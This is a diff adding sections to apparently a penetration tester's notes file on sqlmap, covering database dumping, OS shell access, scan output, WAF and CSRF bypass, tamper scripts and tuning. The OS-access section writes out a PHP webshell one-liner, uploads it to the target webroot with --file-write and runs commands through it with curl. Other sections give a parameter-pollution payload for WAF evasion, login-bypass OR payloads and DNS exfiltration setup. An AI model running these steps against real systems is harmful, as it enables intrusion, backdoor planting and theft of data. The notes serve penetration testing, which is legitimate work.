@@ -266,3 +266,123 @@ Error-based verdicts (`GTID_SUBSET`-family on MySQL) come back fine this way on 
 sinks where time-based heuristics stay silent.
 
 <!-- promoted-slug: sqlmap-ignore-stdin-non-tty -->
+
+## Enumeration deltas: dump formats, inband vs blind speed
+
+- `--dump-format=CSV|HTML|SQLite`: dumps default to CSV under `~/.sqlmap/output/<target>/dump/`; SQLite output lets you re-open the whole dumped DB locally in `sqlite3` and query it (huge for wide tables where console output is unusable).
+- Speed model: sqlmap keeps two query variants per item. Inband (`UNION`/error-based) fetches whole result sets per request; blind (boolean/time) walks every value row-by-row, character-by-character, bit-by-bit. So a dump that takes seconds over UNION can take an hour over time-based; prefer `--technique=BEU` while enumerating whenever those channels are open, and save `T` for final extraction when nothing else exists.
+- `--dump` auto-recognises hash columns and offers to crack (31 hash families, built-in ~1.4M-entry wordlist); answer N to both prompts and export the hashes to hashcat when you have better wordlists/rules.
+- DB `root`/DBA is privileged INSIDE the DBMS only; it says nothing about OS-level rights, and modern deployments keep OS privileges minimal even for DBA users. `--is-dba` predicts FILE privilege, not shells.
+
+<!-- promoted-slug: sqlmap-enum-delta -->
+
+## OS access deltas: file-read fallback, os-shell flow, technique=E
+
+Gate first: `--is-dba`. `current user is DBA: True` is the green light for file ops; on False, `--file-read` typically dies with `no data retrieved`.
+
+File read: on failure sqlmap automatically falls back from the slow technique to plain UNION; if it still warns about `continuous data retrieval problems`, rerun with `--no-cast` or `--hex`. Successful reads land as `~/.sqlmap/output/<target>/files/<name>`.
+
+File write prerequisites (MySQL): `INTO OUTFILE` needs `secure_file_priv` empty/disabled AND a directory the DB user can write AND the web server can read. Check it in-band first:
+
+```sql
+SELECT @@secure_file_priv;
+```
+
+`--os-shell` interactive flow (what the prompts mean, `--batch` picks the defaults):
+
+1. Asks the web language (ASP/ASPX/JSP/PHP) - it needs this to pick the stager format.
+2. Asks for the webroot: common locations list (`/var/www/`, `/var/www/html/`, `/usr/local/apache2/htdocs`, ...), custom path, a list file, or brute-force search. It first tries full-path disclosure from error pages.
+3. Uploads a randomly named stager + backdoor pair (e.g. `tmpumgzr.php`) via `LIMIT ... LINES TERMINATED BY` file-write, then drops you into `os-shell>`. Quit with `x`/`q`.
+
+Technique fallback: `--os-shell` over UNION can come up as `No output`. Rerun forcing error-based, which returns output in-band:
+
+```sh
+sqlmap -u "http://TARGET/?id=1" --os-shell --technique=E
+```
+
+Manual webshell alternative when os-shell's stager fails but file-write works:
+
+```sh
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+sqlmap -u "http://TARGET/?id=1" --file-write shell.php --file-dest "/var/www/html/shell.php"
+curl "http://TARGET/shell.php?cmd=id"
+```
+
+<!-- promoted-slug: sqlmap-os-shell-flow -->
+
+## Reading sqlmap scan output
+
+What the log lines mean while a run is going (they tell you the injection type before it finishes, and what to write in the report):
+
+- `target URL content is stable`: identical repeated requests return near-identical responses, so TRUE/FALSE diffs are meaningful. Unstable targets still work; sqlmap strips the noise.
+- `parameter 'id' appears to be dynamic`: value changes DO change the response, so the param likely reaches a query. A static response means the value is not processed here.
+- `heuristic (basic) test shows ... might be injectable (possible DBMS: 'MySQL')`: an intentionally invalid value (e.g. `1",)..).))'`) produced a DBMS error. An indication, not proof; the full test follows. It also names the likely DBMS, so accept the "skip other DBMS payloads" prompt (Y).
+- `heuristic (XSS) test shows ... might be vulnerable`: free side-check sqlmap runs on every param; worth noting when no SQLi is found.
+- `reflective value(s) found and filtering out`: payload fragments are echoed back in the page; sqlmap filters them before comparing (echoed junk would break the diff).
+- `parameter 'id' appears to be 'AND boolean-based blind' injectable (with --string="...")`: sqlmap found a constant string that appears only in TRUE responses; that is a hard oracle, not a fuzzy diff, so this finding is low false-positive risk.
+- `time-based comparison requires a larger statistical model`: sqlmap is collecting baseline response times to distinguish a deliberate delay from jitter, works even on high-latency links. Wait it out.
+- `automatically extending ranges for UNION query ... tests` / `'ORDER BY' technique appears to be usable`: UNION checks are request-capped (10) until another technique looks promising, then the cap lifts; ORDER BY usability lets it binary-search the column count fast.
+- `parameter 'id' is vulnerable`: confirmed. Answer `N` to "keep testing others" unless you need every injectable param for the report.
+- Final block `sqlmap identified the following injection point(s)`: only PROVABLY exploitable points are listed (type, title, payload). Copy these payloads as the manual PoC.
+
+Session caching: everything found is stored under `~/.sqlmap/output/<target>/`; subsequent runs resume the injection point from the session file and skip detection entirely. Use `--fresh-queries` when you need it to re-fetch instead of trusting cached results.
+
+<!-- promoted-slug: sqlmap-output-reading -->
+
+## Protection-bypass deltas: CSRF, WAF fingerprint, HPP, tamper ordering
+
+CSRF tokens: besides `--csrf-token=<param>`, sqlmap AUTO-DETECTS the token: if any provided parameter name contains `csrf`, `xsrf` or `token`, it prompts to refresh that param per request (parses fresh values out of each response). So a form with `t0ken=...` just needs a `y` at the prompt, or `--csrf-token=t0ken` with `--batch`.
+
+WAF fingerprint mechanics: the very first thing sqlmap does is send one malicious payload under a non-existent parameter name (e.g. `?pfov=...`) and diff the response. A big change means a protection layer (ModSecurity typically answers `406 Not Acceptable`); identification then runs through the identYwaf signature set (~80 WAFs). `--skip-waf` suppresses this pre-test when you want a quieter start. If the first responses are 5xx, suspect default-UA blacklisting and reach for `--random-agent` before anything else.
+
+HTTP parameter pollution: same idea as `--chunked` but in the URL/form body. Split the payload across repeated same-name parameters; platforms that concatenate duplicates (classic ASP/ASP.NET) reassemble it server-side while the WAF sees only fragments:
+
+```text
+?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users
+```
+
+Tamper script mechanics worth knowing:
+
+- Chained tampers (`--tamper=between,randomcase`) do NOT run in the order typed; each has a predefined priority so syntax-rewriting scripts (e.g. `ifnull2ifisnull`) run before content-agnostic ones (e.g. `appendnullbyte`).
+- A tamper is just a Python `tamper(payload, **kwargs)` function returning the modified payload; write a custom one when the target needs a bespoke transform (classic use: second-order SQLi, where the payload must survive storage and execute on a later page).
+- `--list-tampers` prints every built-in script with its description; pick by what the filter blocks (`=` -> `between`/`equaltolike`, spaces -> `space2*` family, case-match -> `randomcase`, ModSecurity -> `modsecurityversioned`/`zeroversioned`).
+
+<!-- promoted-slug: sqlmap-protection-bypass-delta -->
+
+## Tuning deltas: payload anatomy, OR payloads, UNION hints
+
+Payload anatomy: every request sqlmap sends is a `vector` (the SQL it wants executed, e.g. `UNION ALL SELECT 1,2,VERSION()`) wrapped in `boundaries` (prefix/suffix pair that lands the vector inside the vulnerable statement). `--level` widens both sets; `--risk` widens the vectors.
+
+- Login/auth injection points usually need `OR` payloads (`' OR 1=1`), which only run at `--risk=2`+. Reason: `OR` against an `UPDATE`/`DELETE` statement can modify or wipe rows, so risk 1 excludes them. Raise risk for login forms, keep it low against anything that writes.
+- `-v 3` prints each `[PAYLOAD]` line as it is tried; compare runs at different level/risk to see which boundaries are being added.
+
+Comparison/detection helpers (when the target is noisy or the oracle is unusual):
+
+```sh
+sqlmap -u URL --titles          # compare only the HTML <title> (heavy dynamic content)
+sqlmap -u URL --string=success  # TRUE responses contain this string, FALSE do not
+sqlmap -u URL --code=200        # TRUE = 200, FALSE = 500, use the status code as oracle
+sqlmap -u URL --text-only       # strip HTML tags, compare visible text only
+```
+
+UNION-specific hints:
+
+```sh
+sqlmap -u URL --union-cols=5   # known column count, skips the search
+sqlmap -u URL --union-char=a   # default fillers (NULL / random int) break the query; use a compatible dummy
+sqlmap -u URL --union-from=users  # Oracle (and friends) need a FROM <table> appendix
+```
+
+Data-retrieval problem flags (sqlmap itself suggests these on failure; set them up front when the target has bad bytes or binary columns):
+
+```sh
+sqlmap -r req.txt --no-cast          # skip CAST(... AS NCHAR); needed when casting corrupts/encodes the data
+sqlmap -r req.txt --hex              # retrieve data as hex, decode locally; reliable for binary/bad-byte content
+sqlmap -r req.txt --binary-fields=content  # mark specific columns binary (e.g. blob/file content)
+sqlmap -r req.txt --fresh-queries    # ignore cached session results, re-fetch
+sqlmap -r req.txt --time-sec=1       # shorten the time-based delay (default 5s); a 1s oracle still works and is far faster
+```
+
+Out-of-band mode: when every in-band channel is closed and time-based is too slow, sqlmap can exfiltrate via DNS. Run it on a host that is authoritative DNS for a domain you control and pass `--dns-domain=yourdomain.com`; results come back as subdomain lookups (`<answer>.yourdomain.com`), one query chunk per lookup.
+
+<!-- promoted-slug: sqlmap-tuning-delta -->
